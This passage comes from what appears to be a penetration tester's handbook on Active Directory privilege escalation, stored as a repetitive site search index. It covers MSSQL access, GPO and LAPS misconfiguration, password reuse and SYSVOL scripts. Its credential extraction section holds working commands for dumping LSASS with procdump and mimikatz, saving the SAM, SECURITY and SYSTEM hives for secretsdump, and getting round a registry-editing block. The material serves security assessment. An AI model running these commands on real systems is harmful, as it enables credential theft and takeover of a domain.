{$_.Status -like \"Accessible\"} If you want to run from mssql with impacket this is the way. Also remember the -windows-auth flag. Otherwise it will authenticate using SQL authentication. python3 mssqlclient.py -windows-auth evilcorp.local/user@192.168.1.1 How to exploit # Recommendation # Related Vulnerabilities # This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue] References #","title":"Check for Misconfgured Access Control of MSSQL"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/#background","text":"Sometimes sql-servers are integrated into domain, and sometimes normal domain-users are allowed to authenticate to the sql-server. This can allow low priviliged users to gain access to sensitive data, and can also allow the user in some circumstances to be able to execute commands on the server. It might also be possible to force the domain user that is running the database instance to authenticate.","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/#pre-requisites","text":"Valid domain user","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/#risks","text":"","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/#how-to-check-for","text":"You can enumerate SQL instances using PowerUpSQL. get-sqlinstancedomain -verbose However, these are based on SPNs that includes MSSQL. So there might be a lot of false positives here. For example old computer objects that doesn't really exist anymore. You can get a list of all hosts like this: get-sqlinstancedomain -verbose | select-object -property ComputerName Check if your current user can authenticate to the identified mssql instance $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like \"Accessible\"} If you want to run from mssql with impacket this is the way. Also remember the -windows-auth flag. Otherwise it will authenticate using SQL authentication. python3 mssqlclient.py -windows-auth evilcorp.local/user@192.168.1.1","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/#related-vulnerabilities","text":"This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue]","title":"Related Vulnerabilities"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/#references","text":"","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/","text":"TLDR # Background # The Components # Group Policy Object All GPOs can be viewed using the Group Policy Management program found in the Server Manager suite. GPOs contains policies that affect Users or computers. The actual policies are stored on the Domain Controller, in the share called SYSVOL: ex: \\\\contoso.local\\sysvol\\contoso.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9} Each GPO has a uniq GUID associated with it. A GPO can only apply to Users or Computers. Organizational Units (OU) OUs are just LDAP Containers, that can be used a little bit however you like. But it is usually used to logically group together Users, Groups or Computers. They are usually organized around geography (Country/City) or department (IT, Economy, HR, etc). GpLink GPOs can be linked to domains, sites, and OUs. For example, the default GPO is called Default Domain Policy and it is linked to the Domain Controller OU. The GpLink is stored on the LDAP entry that is linked to a GPO. So if you for example click on an OU, like the \"Domain Controller\" OU, you will see the attribute GpLink. The format of the \u201cgplink\u201d attribute value is [<Distinguished name of the GPO>;<0 if the link is not enforced, 1 if the link is enforced>] . GPO Enforcement Logic # GpLinks can be enforced , or not. OUs can block inheritance , or not. If a GpLink is enforced, the associated GPO will apply to the linked OU and all child objects, regardless of whether any OU in that tree blocks inheritance. If a GpLink is not enforced, the associated GPO will apply to the linked OU and all child objects, unless any OU within that tree blocks inheritance. So a GpLink is always on, even though it says that it is not enforced. The above mentioned rules apply to most scenarios. - WMI Filtering - You can further filter down to where a GPO is applied using \"WMI-Filtering\". To for example only apply the GPO to Windows 7 machines, or stuff like that. - Security Filtering - Filters so that an a GPO is only applied to specific users or computers. So who can edit a GPO? It is just a simple ACL as any ACL on any other object. You can specify that a specific GPO can be edited by a specific user or group. The user that can edit that GPO can thus takeover users or computers that that GPO is applied to. How to exploit # There are at least three different ways that an attacker can abuse GPOs to escalate privileges in a domain: - Who can create new GPOs in the domain. - Who can link GPOs to which OUs. - Who can modify existing GPOs (that may or may not be currently linked). How to check for # You will want to check for ACLs that are between a low privileged user and a GPO can controls a high privileged object, such as a computer or user. This cypher-query will check for user that Own GPOs. match path=allShortestPaths((u:User {admincount: false})-[r]->(g:GPO)) return path Check the default group policy called Default Domain Controllers Policy . Check the setting for Allow Log On Locally . If this is set to, for example, Domain Users , everyone in the domain has the permission to physically log on to the Domain Controllers . So if you have physical access to the DC you can just log in with a Domain User account. Also check Allow log on through Remote Desktop Services . If you don't have physical access you might be able to log on using a VM console, if that is enabled on the Domain Controller, or using an ILO. This issue has been documented by Sean Metcalf here: Recommendation # References # Seminal blogpost by Will Shroeder (HarmJoy) A must-read written by Wald0 Map out all GPO:s with powerview: Get-NetGPO Check which GPOs i have write access to First find out which users that have access. grep \"IdentityReference\" gpoer.txt > ident.txt grep -A 10 -i Autentiserade gpoer.txt grep -A 10 -i \"Domain users\" gpoer.txt Check which computer those GPO:s controls If I can have write access to a GPO that is applied to Inte \u00e4r standardgrupper Vilka anv\u00e4ndare har write","title":"Check for Misconfigured GPO"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/#tldr","text":"","title":"TLDR"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/#background","text":"","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/#the-components","text":"Group Policy Object All GPOs can be viewed using the Group Policy Management program found in the Server Manager suite. GPOs contains policies that affect Users or computers. The actual policies are stored on the Domain Controller, in the share called SYSVOL: ex: \\\\contoso.local\\sysvol\\contoso.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9} Each GPO has a uniq GUID associated with it. A GPO can only apply to Users or Computers. Organizational Units (OU) OUs are just LDAP Containers, that can be used a little bit however you like. But it is usually used to logically group together Users, Groups or Computers. They are usually organized around geography (Country/City) or department (IT, Economy, HR, etc). GpLink GPOs can be linked to domains, sites, and OUs. For example, the default GPO is called Default Domain Policy and it is linked to the Domain Controller OU. The GpLink is stored on the LDAP entry that is linked to a GPO. So if you for example click on an OU, like the \"Domain Controller\" OU, you will see the attribute GpLink. The format of the \u201cgplink\u201d attribute value is [<Distinguished name of the GPO>;<0 if the link is not enforced, 1 if the link is enforced>] .","title":"The Components"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/#gpo-enforcement-logic","text":"GpLinks can be enforced , or not. OUs can block inheritance , or not. If a GpLink is enforced, the associated GPO will apply to the linked OU and all child objects, regardless of whether any OU in that tree blocks inheritance. If a GpLink is not enforced, the associated GPO will apply to the linked OU and all child objects, unless any OU within that tree blocks inheritance. So a GpLink is always on, even though it says that it is not enforced. The above mentioned rules apply to most scenarios. - WMI Filtering - You can further filter down to where a GPO is applied using \"WMI-Filtering\". To for example only apply the GPO to Windows 7 machines, or stuff like that. - Security Filtering - Filters so that an a GPO is only applied to specific users or computers. So who can edit a GPO? It is just a simple ACL as any ACL on any other object. You can specify that a specific GPO can be edited by a specific user or group. The user that can edit that GPO can thus takeover users or computers that that GPO is applied to.","title":"GPO Enforcement Logic"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/#how-to-exploit","text":"There are at least three different ways that an attacker can abuse GPOs to escalate privileges in a domain: - Who can create new GPOs in the domain. - Who can link GPOs to which OUs. - Who can modify existing GPOs (that may or may not be currently linked).","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/#how-to-check-for","text":"You will want to check for ACLs that are between a low privileged user and a GPO can controls a high privileged object, such as a computer or user. This cypher-query will check for user that Own GPOs. match path=allShortestPaths((u:User {admincount: false})-[r]->(g:GPO)) return path Check the default group policy called Default Domain Controllers Policy . Check the setting for Allow Log On Locally . If this is set to, for example, Domain Users , everyone in the domain has the permission to physically log on to the Domain Controllers . So if you have physical access to the DC you can just log in with a Domain User account. Also check Allow log on through Remote Desktop Services . If you don't have physical access you might be able to log on using a VM console, if that is enabled on the Domain Controller, or using an ILO. This issue has been documented by Sean Metcalf here:","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/#references","text":"Seminal blogpost by Will Shroeder (HarmJoy) A must-read written by Wald0 Map out all GPO:s with powerview: Get-NetGPO Check which GPOs i have write access to First find out which users that have access. grep \"IdentityReference\" gpoer.txt > ident.txt grep -A 10 -i Autentiserade gpoer.txt grep -A 10 -i \"Domain users\" gpoer.txt Check which computer those GPO:s controls If I can have write access to a GPO that is applied to Inte \u00e4r standardgrupper Vilka anv\u00e4ndare har write","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_laps/","text":"Background # Local Administrator Password Solution (LAPS) is a great AD feature that in a secure way mange local administrator passwords. It offers a way to prevent the reuse one the same password on multiple machines. LAPS sets a complex and unique password for every computer in the domain. Thus removing the possibility for lateral movement once a local admin password has been found. Before LAPS local administrator passwords were often managed through Group Policy Preferences, which was a terrible solution (as can be seen in the chapter on GPP). They were sometimes set using scripts found in the SYSVOL, again exposing them to everyone with access to the SYSVOL. Another common options was to use third party products, Thycotic, CyberArk, Liberman, etc. To use LAPS the administrator must install LAPS on the management server. This will extend the AD schema and add two new attributes: ms-McsAdmPwd and ms-Mcs-AdmPwdExpirationTime . ms-McsAdmPwd contains the local administrator password in cleartext. ms-Mcs-AdmPwdExpirationTime contains the time and date when the password expires. A LAPS agent will need to be running on each computer. It is this agent that changes the password. If the access control of the attribute is incorrectly configured it can allow too many users to have read access to the password attribute, thus allowing a user to read the local administrator password of multiple computers. Even if your user is not allowed to read the password it is still possible to enumerate who can read the password. Thos users are then attrctive targets. Normally not even the computer itself should have read-access to the attributes. Only be able to update those attributes, but not read them. How to check for existence of LAPS # To check if LAPS is running on your computer you can check for the following dll AdmPwd.dll , in its default location C:\\Program Files\\LAPS\\CSE\\ . You can check if the schema has been updated with the new attributes: Get-ADObject 'CN=ms-mcs-admpwd, CN=Schema, CN=configuration, DC=evilcorp, DC=local' If it returns data it has the updated schema, otherwise you will get an error. The attribute ms-Mcs-AdmPwdExpirationTime is readible to everyone. So every computer that is administrated using LAPS will have this attribute. It is therefore possible to enumerate all computers that are nog included in LAPS. Using the PowerSploit command get-DomainGpo -Identity \"*LAPS*\" . I haven't tested this one. But it should list Get-NetOU | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_ } Using bloodhound this query can be used: MATCH (u) -[:ReadLAPSPassword]-(c:Computer) return u; How to check who can view the passwords in cleartext # Get-NetOU -FullData | References # https://rastamouse.me/2018/03/laps---part-1/","title":"Misconfigured LAPS"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_laps/#background","text":"Local Administrator Password Solution (LAPS) is a great AD feature that in a secure way mange local administrator passwords. It offers a way to prevent the reuse one the same password on multiple machines. LAPS sets a complex and unique password for every computer in the domain. Thus removing the possibility for lateral movement once a local admin password has been found. Before LAPS local administrator passwords were often managed through Group Policy Preferences, which was a terrible solution (as can be seen in the chapter on GPP). They were sometimes set using scripts found in the SYSVOL, again exposing them to everyone with access to the SYSVOL. Another common options was to use third party products, Thycotic, CyberArk, Liberman, etc. To use LAPS the administrator must install LAPS on the management server. This will extend the AD schema and add two new attributes: ms-McsAdmPwd and ms-Mcs-AdmPwdExpirationTime . ms-McsAdmPwd contains the local administrator password in cleartext. ms-Mcs-AdmPwdExpirationTime contains the time and date when the password expires. A LAPS agent will need to be running on each computer. It is this agent that changes the password. If the access control of the attribute is incorrectly configured it can allow too many users to have read access to the password attribute, thus allowing a user to read the local administrator password of multiple computers. Even if your user is not allowed to read the password it is still possible to enumerate who can read the password. Thos users are then attrctive targets. Normally not even the computer itself should have read-access to the attributes. Only be able to update those attributes, but not read them.","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_laps/#how-to-check-for-existence-of-laps","text":"To check if LAPS is running on your computer you can check for the following dll AdmPwd.dll , in its default location C:\\Program Files\\LAPS\\CSE\\ . You can check if the schema has been updated with the new attributes: Get-ADObject 'CN=ms-mcs-admpwd, CN=Schema, CN=configuration, DC=evilcorp, DC=local' If it returns data it has the updated schema, otherwise you will get an error. The attribute ms-Mcs-AdmPwdExpirationTime is readible to everyone. So every computer that is administrated using LAPS will have this attribute. It is therefore possible to enumerate all computers that are nog included in LAPS. Using the PowerSploit command get-DomainGpo -Identity \"*LAPS*\" . I haven't tested this one. But it should list Get-NetOU | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_ } Using bloodhound this query can be used: MATCH (u) -[:ReadLAPSPassword]-(c:Computer) return u;","title":"How to check for existence of LAPS"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_laps/#how-to-check-who-can-view-the-passwords-in-cleartext","text":"Get-NetOU -FullData |","title":"How to check who can view the passwords in cleartext"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_laps/#references","text":"https://rastamouse.me/2018/03/laps---part-1/","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/","text":"Background # Pre-requisites # Risks # Warning. If you do this against multiple domain controllers you might lockout the domain user Administrator, which might not be desirable. So make sure you exclude the majority of domain-controllers. How to check for # crackmapexec smb 192.1.1.0/24 -u Administrator -p password --local-auth If you says \"Pwn!ed\" after you have successfully authenticated as the local admin. How to exploit # Recommendation # Related Vulnerabilities # References #","title":"Check for Reuse of Local Admin Password"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/#background","text":"","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/#risks","text":"Warning. If you do this against multiple domain controllers you might lockout the domain user Administrator, which might not be desirable. So make sure you exclude the majority of domain-controllers.","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/#how-to-check-for","text":"crackmapexec smb 192.1.1.0/24 -u Administrator -p password --local-auth If you says \"Pwn!ed\" after you have successfully authenticated as the local admin.","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/#references","text":"","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_scripts_on_sysvol/","text":"Background # Scripts are often stored in the SYSVOL of the Domain Controller. These scripts might include sensitive data, such as credentials. Historically these scripts have been used to, among other things, set the password of the local administrator. How to test for # Passwords are usually not defined using a variable called \"Password\", so we will compile a list of strings that are common to use for passwords: aPwd pwd password net user net use x: \\\\dc01\\sysvol x: gci -recurse -Include config *.bat, *.cmd, *.ps1, *.vbs, *.js, *.wsf, *.kix, *.txt | out-file C:\\Users\\<YOUUSER>\\Documents\\scriptsearch.txt","title":"Check for Scripts in SYSVOL"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_scripts_on_sysvol/#background","text":"Scripts are often stored in the SYSVOL of the Domain Controller. These scripts might include sensitive data, such as credentials. Historically these scripts have been used to, among other things, set the password of the local administrator.","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_scripts_on_sysvol/#how-to-test-for","text":"Passwords are usually not defined using a variable called \"Password\", so we will compile a list of strings that are common to use for passwords: aPwd pwd password net user net use x: \\\\dc01\\sysvol x: gci -recurse -Include config *.bat, *.cmd, *.ps1, *.vbs, *.js, *.wsf, *.kix, *.txt | out-file C:\\Users\\<YOUUSER>\\Documents\\scriptsearch.txt","title":"How to test for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_unsupported_os/","text":"Background # Identify computers that are running operating systems that have reached end-of-life, and therefore does not receive new updates, leaving them vulnerable if vulnerabilities are found. There are two attributes that are of relevance here: operatingsystem - show you the OS version, Windows Server 2008 for example operatingsystemversion - it stores the version of the OS. Can these attributes be trusted? Yes and no. They are updates when a domain computer is joined, and when updated and restarted. So in that sense it should be fairly up to date. But it can be changed manually on the computer. \"AD relies on the individual Windows computers to take care of it \u2013 such as when joining the domain, being upgraded, being service packed, or after reboot.\" https://docs.microsoft.com/en-us/archive/blogs/askds/monthly-mail-sack-i-hope-your-data-plan-is-paid-up-edition#ados Pre-requisites # Domain account. Risks # No risks. How to check for # In bloodhound the following query can be made: MATCH (H:Computer {enabled: true}) WHERE H.operatingsystem =~ '(?i).*(2000|2003|2008|xp|vista|me).*' RETURN H.name,H.operatingsystem How to exploit # Recommendation # Related Vulnerabilities # vuln_ References # https://docs.microsoft.com/en-us/archive/blogs/askds/monthly-mail-sack-i-hope-your-data-plan-is-paid-up-edition#ados","title":"Check for Unsupported OS"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_unsupported_os/#background","text":"Identify computers that are running operating systems that have reached end-of-life, and therefore does not receive new updates, leaving them vulnerable if vulnerabilities are found. There are two attributes that are of relevance here: operatingsystem - show you the OS version, Windows Server 2008 for example operatingsystemversion - it stores the version of the OS. Can these attributes be trusted? Yes and no. They are updates when a domain computer is joined, and when updated and restarted. So in that sense it should be fairly up to date. But it can be changed manually on the computer. \"AD relies on the individual Windows computers to take care of it \u2013 such as when joining the domain, being upgraded, being service packed, or after reboot.\" https://docs.microsoft.com/en-us/archive/blogs/askds/monthly-mail-sack-i-hope-your-data-plan-is-paid-up-edition#ados","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_unsupported_os/#pre-requisites","text":"Domain account.","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_unsupported_os/#risks","text":"No risks.","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_unsupported_os/#how-to-check-for","text":"In bloodhound the following query can be made: MATCH (H:Computer {enabled: true}) WHERE H.operatingsystem =~ '(?i).*(2000|2003|2008|xp|vista|me).*' RETURN H.name,H.operatingsystem","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_unsupported_os/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_unsupported_os/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_unsupported_os/#related-vulnerabilities","text":"vuln_","title":"Related Vulnerabilities"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_unsupported_os/#references","text":"https://docs.microsoft.com/en-us/archive/blogs/askds/monthly-mail-sack-i-hope-your-data-plan-is-paid-up-edition#ados","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_writable_executables_on_shares/","text":"Background # If an executable file is found on a share and is writable to other users it is possible for those users to alter the executable, and wait for a legitimate user to execute the file, and thereby gain remote code execution. This is not something that we might want to do on assessments, but good attack vector for a real attacker. How to test for # See the Tools chapter for how to install PowerSploit. The best way to find executables where your domain user has write-access is by using the PowerSploit cmdlet find-interestingFile . It will correcly show that if the user has writable access even if it is by belonging to a group. Find-InterestingFile -Path A:\\ -CheckWriteAccess -Include @('*.exe') | export-csv result.csv References # https://www.harmj0y.net/blog/redteaming/targeted-trojanation/","title":"Check for Writable Executables in Shares"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_writable_executables_on_shares/#background","text":"If an executable file is found on a share and is writable to other users it is possible for those users to alter the executable, and wait for a legitimate user to execute the file, and thereby gain remote code execution. This is not something that we might want to do on assessments, but good attack vector for a real attacker.","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_writable_executables_on_shares/#how-to-test-for","text":"See the Tools chapter for how to install PowerSploit. The best way to find executables where your domain user has write-access is by using the PowerSploit cmdlet find-interestingFile . It will correcly show that if the user has writable access even if it is by belonging to a group. Find-InterestingFile -Path A:\\ -CheckWriteAccess -Include @('*.exe') | export-csv result.csv","title":"How to test for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_writable_executables_on_shares/#references","text":"https://www.harmj0y.net/blog/redteaming/targeted-trojanation/","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/","text":"Credential Extraction # Multiple credentials are stored on a windows computer. Credentials are usually extracted from two sources the process Local Security Authority Subsystem Service (LSASS) and from the registry. Local Security Authority Subsystem Service - LSASS # The Local Security Authority Subsystem Service (LSASS) stores credentials in memory on behalf of users with active Windows sessions. This allows users to seamlessly access network resources, such as file shares, Exchange Server mailboxes, and SharePoint sites, without re-entering their credentials for each remote service. Credentials are stored in the LSASS memory in the following actions are performed: - Logs on to a local session or RDP session on the computer - Runs a task by using the RunAs option - Runs an active Windows service on the computer - Runs a scheduled task or batch job - Runs a task on the local computer by using a remote administration tool NT Hashes # If a domain user performs any of the actions mentioned above the credentials, the NT-hash is stored in the LSASS process. WDigest # If WDigest is enabled the domain accounts credentials are stored in plaintext. Registry # There are three areas in the registry that are of relevance: SAM , SECURITY and SYSTEM . These three different areas contains different kinds of secrets. SAM - Security Accounts Manager # This \"hive\" (area in the registry) contains the hashed passwords for the local users. So it contains the NT-hashes of the local users, the same users that you see when you run net user . It is usually extracted like this: C:\\> reg.exe save hklm\\sam c:\\temp\\sam.save C:\\> reg.exe save hklm\\system c:\\temp\\system.save In order to extract the credentials you need the BOOTKEY, and that key is stored in the hive SYSTEM . The hashes can be extracted like this with impackets module secretsdump.py . python secretsdump.py LOCAL -sam sam.save -system system.save Domain Cached Credentials / DCC2 / MSCASH # When a domain user log in to a computer the credentials for that user is cached on the computer. So that it is possible to log on to the computer even when the computer is offline, and not able to communicate with the Domain Controller. These credentials are stored in the format of Domain Cached Credentials version 2 (DCC2) on Windows Vista and newer. This type of credentials can not be used for Pass-the-Hash attacks. These credentials does not expire. By default up to ten credentials are stored on the machine, on windows 10 at least. This can however be configured by configuring the following registry key, increase or decrease it. HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\CashedLogonsCount The DCC2 hashes are stored in the SECURITY hive. To be more precis in : HKEY_LOCAL_MACHINE\\SECURITY\\Cache . C:\\> reg.exe save hklm\\security c:\\temp\\security.save C:\\> reg.exe save hklm\\system c:\\temp\\system.save The bootkey, which I think can be found in the system hive, needs to be provided in order to extract the DCC2 credentials. python secretsdump.py LOCAL -security security.save -system system.save The DCC2 credentials are not as fast and easy to crack as NT-hashes, but with the right password-list it can be done. LSA Secrets # LSA secrets is an area in the registry, under Security that contains different kinds of interesting secrets. The data is used by Local System Authority, which is why it is called LSA Secrets. Only the SYSTEM user can access the registry. HKEY_LOCAL_MACHINE/Security/Policy/Secrets So what are these secrets? $MACHINE.ACC - Machine account password - Can be used as any other domain account DefaultPassword - If AutoLogon is enabled a password in cleartext can be found. NL$KM ?? When services are run under the context of a local or domain user the credentials for that user is stored in Secrets . Extracting credentials from the LSASS process # Sometimes it is not desirable to use Mimikatz on the target machine, because mimikatz is flagged as malware by most antivirus. There are however other ways to solve the problem, using only windows tools. Living of the land. One way is to dump the lsass process. There are a few ways to do this, one is by using the Task Manager GUI, and the other is by using procdump.exe from sysinternals. Procdump is beneficial if you only have command line access, no gui. Dump using Task manager The GUI way: Open task manager as administrator, rightclick on lsass and click on \"Create dump file\". Transfer the dump-file to an offline windows machine with Mimikatz on it. Dump using procdump.exe If you don't want to download procdump.exe to the victim computer you can host it on another share and then mount the share, and run it from there. It is seldom allowed to mount shares without authentication. net use k: \\\\10.10.11.11\\bbb /user:username password procdump.exe -accepteula -ma lsass.exe lsass.dmp Mimikatz/Pypykatz # Run mimikatz on your offline windows machine token::elevate privilege::debug sekurlsa::minidump lsass.DMP sekurlsa::logonPasswords full pypykatz lsa minidump lsass.DMP Extract credentials from SAM and SECURITY hives from registry # The other way to do it is simply to download the SAM, SYSTEM and SECURITY files from the compromised host. Transfer those files to your offline windows machine with Mimikatz on it, or simply use secretsdump.py. If the machine is running you need to dump the SAM and SYSTEM from the registry. C:\\> reg.exe save hklm\\sam c:\\temp\\sam.save C:\\> reg.exe save hklm\\security c:\\temp\\security.save C:\\> reg.exe save hklm\\system c:\\temp\\system.save python secretsdump.py LOCAL -sam ~/Documents/credsdump/sam.save -security ~/Documents/credsdump/security.save -system ~/Documents/credsdump/system.save See the cracking chapter for instructions on how to crack these hashes. Bypassing restrictions # If you encounter a error such as the following ERROR Registry editing has been disabled by your administrator you will need to bypass it. # First verify the current setting Get-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name DisableRegistryTools # Change the setting to disable Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name DisableRegistryTools -Value 0 Some other techniques are found here: https://www.online-tech-tips.com/windows-xp/registry-disabled-by-administrator/ Extract credentials from SAM and SECURITY hives from disk # If you have physical access to the machine and it does not use BitLocker you can just boot up the computer with a live linux and then mount the windows disk. # if the below command shows \"Microsoft basic data\" or nothing then it is likely that the partition is encrypted, and you can just forget about it and move on. blkid lsblk -f # if the disk is ntfs or vfat you can mount it like this. Read only. mount -t ntfs-3g -o ro /dev/sda3 /mnt/something mount -t vfat -o ro /dev/sda3 /mnt/something","title":"Credential Extraction (LSASS/SAM)"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#credential-extraction","text":"Multiple credentials are stored on a windows computer. Credentials are usually extracted from two sources the process Local Security Authority Subsystem Service (LSASS) and from the registry.","title":"Credential Extraction"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#local-security-authority-subsystem-service-lsass","text":"The Local Security Authority Subsystem Service (LSASS) stores credentials in memory on behalf of users with active Windows sessions. This allows users to seamlessly access network resources, such as file shares, Exchange Server mailboxes, and SharePoint sites, without re-entering their credentials for each remote service. Credentials are stored in the LSASS memory in the following actions are performed: - Logs on to a local session or RDP session on the computer - Runs a task by using the RunAs option - Runs an active Windows service on the computer - Runs a scheduled task or batch job - Runs a task on the local computer by using a remote administration tool","title":"Local Security Authority Subsystem Service - LSASS"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#nt-hashes","text":"If a domain user performs any of the actions mentioned above the credentials, the NT-hash is stored in the LSASS process.","title":"NT Hashes"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#wdigest","text":"If WDigest is enabled the domain accounts credentials are stored in plaintext.","title":"WDigest"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#registry","text":"There are three areas in the registry that are of relevance: SAM , SECURITY and SYSTEM . These three different areas contains different kinds of secrets.","title":"Registry"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#sam-security-accounts-manager","text":"This \"hive\" (area in the registry) contains the hashed passwords for the local users. So it contains the NT-hashes of the local users, the same users that you see when you run net user . It is usually extracted like this: C:\\> reg.exe save hklm\\sam c:\\temp\\sam.save C:\\> reg.exe save hklm\\system c:\\temp\\system.save In order to extract the credentials you need the BOOTKEY, and that key is stored in the hive SYSTEM . The hashes can be extracted like this with impackets module secretsdump.py . python secretsdump.py LOCAL -sam sam.save -system system.save","title":"SAM - Security Accounts Manager"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#domain-cached-credentials-dcc2-mscash","text":"When a domain user log in to a computer the credentials for that user is cached on the computer. So that it is possible to log on to the computer even when the computer is offline, and not able to communicate with the Domain Controller. These credentials are stored in the format of Domain Cached Credentials version 2 (DCC2) on Windows Vista and newer. This type of credentials can not be used for Pass-the-Hash attacks. These credentials does not expire. By default up to ten credentials are stored on the machine, on windows 10 at least. This can however be configured by configuring the following registry key, increase or decrease it. HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\CashedLogonsCount The DCC2 hashes are stored in the SECURITY hive. To be more precis in : HKEY_LOCAL_MACHINE\\SECURITY\\Cache . C:\\> reg.exe save hklm\\security c:\\temp\\security.save C:\\> reg.exe save hklm\\system c:\\temp\\system.save The bootkey, which I think can be found in the 